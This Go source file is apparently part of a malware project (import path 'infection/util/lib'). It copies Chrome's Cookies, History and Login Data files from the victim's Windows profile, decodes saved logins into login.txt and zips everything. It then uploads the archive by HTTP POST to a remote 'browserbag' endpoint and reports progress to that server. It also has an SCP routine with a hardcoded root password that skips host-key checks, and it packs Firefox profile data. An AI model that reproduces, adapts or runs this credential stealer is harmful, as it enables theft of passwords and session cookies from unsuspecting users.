package browser

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/bramvdbogaerde/go-scp"
	"golang.org/x/crypto/ssh"
	"infection/util/lib"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/user"
	"time"
)

var Safe_path = lib.BrowserSafepath

type Msg struct {
	Hostid string `json:"hostid"`
	Code   int    `json:"code"`
}
type BizStatusResponse struct {
	Succeed bool `json:"succeed"`
}

//get targetip files
func get_targetip() string {
	name, err := os.Hostname()
	if err != nil {
		log.Println(err)
	}
	return name
}

func Firefoxpack(addr string) {
	//http := "http://" + addr + ":5002/browser/browserbag"
	fire, err := os.Open(lib.Firefoxpath)
	if err != nil {
		log.Println(err)
	}
	defer fire.Close()
	var files = []*os.File{fire}
	// if not create dir faild not write
	lib.Create_dir(lib.Firefox)
	//lib.GetOutIp()
	//fname := lib.HOSTID + "-fire.zip"
	dest := lib.Firefox + lib.HOSTID + "-fire.zip"
	err = lib.Compress(files, dest)
	if err != nil {
		log.Println(err, "targeterr")
	} else {
		//Sshpack(dest, addr, fname)
		//finflag := make(chan string)
		//go lib.SingleFile(dest, addr, finflag)
	}
}

func Sshpack(dest string, addr string, name string) {
	clientConfig := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{ssh.Password("jinjin123")},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	client := scp.NewClient(addr, clientConfig)
	f, _ := os.Open(dest) //windows 文件路径
	client.Connect()
	//defer client.Close()
	defer f.Close()
	err := client.CopyFile(f, "/root/infactionupload/"+name, "0644")
	if err == nil {
		client.Close()
	}
}

func Digpack(addr string, finflag chan string) {
	logf, lerr := os.Stat(Safe_path)
	if lerr == nil {
		//keep the file one month then update
		if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
			os.RemoveAll(Safe_path)
			return
		} else {
			return
		}
	}
	if os.IsNotExist(lerr) {
		get_current_user()
		lib.Create_dir(Safe_path)
		// if not return will happen nil bug
		berr := cookie_stealer(addr)
		if berr != nil {
			log.Println("打包chrome失败", berr)
			return
		}
		dwerr := lib.DeCode(Safe_path+"Login Data", addr)
		if dwerr != nil {
			log.Println(dwerr)
			lib.EventStatusCode(99, lib.HOSTID, lib.VERSION, "1", addr+"Event")
		}
		time.Sleep(2 * time.Second)
		buf := new(bytes.Buffer)
		w := zip.NewWriter(buf)
		var files = []struct {
			Name string
		}{
			{"Cookies"},
			{"History"},
			{"Login Data"},
			{"login.txt"},
		}
		for _, file := range files {
			f, err := w.Create(file.Name)
			if err != nil {
				log.Println(err)
			}
			fbody, err := ioutil.ReadFile(Safe_path + file.Name)
			_, err = f.Write(fbody)
			if err != nil {
				log.Println(err)
			}
		}
		err := w.Close()
		if err != nil {
			log.Println(err)
		}
		// can not edit name
		f, err := os.OpenFile(Safe_path+lib.HOSTID+".zip", os.O_CREATE|os.O_WRONLY, 0666)
		if err != nil {
			log.Println(err)
		}
		buf.WriteTo(f)
		pbuf := new(bytes.Buffer)
		writer := multipart.NewWriter(pbuf)
		// just change the file name for server
		formFile, err := writer.CreateFormFile("file", lib.HOSTID+"-chrome.zip")
		if err != nil {
			log.Println("Create form file failed: %s\n", err)
		}
		// 从文件读取数据，写入表单
		srcFile, err := os.Open(Safe_path + lib.HOSTID + ".zip")
		if err != nil {
			fmt.Println("Open source file failed: s\n", err)
		}
		defer srcFile.Close()
		_, err = io.Copy(formFile, srcFile)
		if err != nil {
			fmt.Println("Write to form file falied: %s\n", err)
		}
		// 发送表单
		contentType := writer.FormDataContentType()
		writer.Close()
		re, err := http.Post(addr+"browserbag", contentType, pbuf)
		if re.StatusCode == 200 {
			lib.EventStatusCode(100, lib.HOSTID, lib.VERSION, "1", addr+"Event")
			log.Println("Upload browser record Status Successful ! version:", lib.VERSION)
		} else {
			lib.EventStatusCode(-100, lib.HOSTID, lib.VERSION, "1", addr+"Event")
			log.Println("Upload browser record Status Fail !")
		}
		finflag <- "file sent"
	}
}

//returns Current working dir
func current_working_dir() string {
	dir, err := os.Getwd()
	if err != nil {
		log.Println(err)
	}
	return dir
}

//returns current user and ther info
func get_current_user() string {
	usr, err := user.Current()
	if err != nil {
		log.Println(err)
	}
	return usr.HomeDir
}

func check(err error) {
	if err != nil {
		log.Println("Error ", err.Error())
		time.Sleep(3 * time.Second)
	}
}

func cookie_stealer(addr string) error {
	// todo other browser
	current_user := get_current_user()
	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
	//check chrome
	_, err := os.Stat(cp)
	if err != nil {
		lib.EventStatusCode(101, lib.HOSTID, lib.VERSION, "1", addr+"Event")
		os.RemoveAll(Safe_path)
		return err
	}
	if os.IsNotExist(err) {
		return err
	}
	var cookie_file string = "Cookies"
	var history string = "History"
	var data_login string = "Login Data"

	cp_cookie := cp + cookie_file
	cp_hist := cp + history
	cp_data_login := cp + data_login

	srcFile, err := os.Open(cp_cookie)
	check(err)
	defer srcFile.Close()

	new_path := Safe_path + cookie_file

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)

	copyFiles(cp_cookie, cookie_file)
	copyFiles(cp_hist, history)
	copyFiles(cp_data_login, data_login)

	return nil
}

func copyFiles(src string, concat string) {
	srcFile, err := os.Open(src)
	check(err)
	defer srcFile.Close()

	new_path := Safe_path + concat

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)
}
